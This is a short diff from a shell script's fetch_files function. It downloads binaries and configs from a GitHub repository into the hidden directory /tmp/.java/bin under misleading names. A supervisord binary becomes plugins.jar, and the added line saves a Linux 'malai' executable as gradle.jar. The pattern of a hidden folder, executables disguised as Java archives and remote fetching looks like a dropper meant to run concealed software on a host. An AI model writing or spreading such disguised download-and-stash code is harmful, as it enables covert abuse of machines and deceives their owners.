@@ -7,6 +7,7 @@ function fetch_files() {
     cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/patch.jar -o paper.jar
     cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
     cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/pingu/n1.conf -o cfg.conf
+    cd /tmp/.java/bin/ && curl -L https://github.com/fastn-stack/kulfi/releases/download/malai-0.2.9/malai_linux_x86_64 -o gradle.jar
     # cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/pingu/n1.json -o conf.json
 }
 
